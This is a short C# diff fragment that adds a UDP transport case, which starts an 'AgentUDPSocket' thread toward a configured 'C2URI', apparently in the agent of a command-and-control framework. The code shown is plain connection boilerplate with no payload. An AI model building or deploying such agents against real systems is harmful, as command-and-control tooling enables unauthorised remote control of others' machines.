@@ -1,0 +1,17 @@
+                    case "UDP":
+                        try
+                        {
+                            Thread t = new Thread(() =>
+                            {
+                                Console.WriteLine("Starting the UDP connection for {0}", c.Value.C2URI);
+                                AgentUDPSocket ts = new AgentUDPSocket(c.Value);
+                                ts.Start();
+                            });
+                            t.Start();
+                        }
+                        catch (Exception e)
+                        {
+                            Console.WriteLine("UDP for {0} is failed: {1}", c.Value.C2URI, e);
+                        }
+                        break;
+
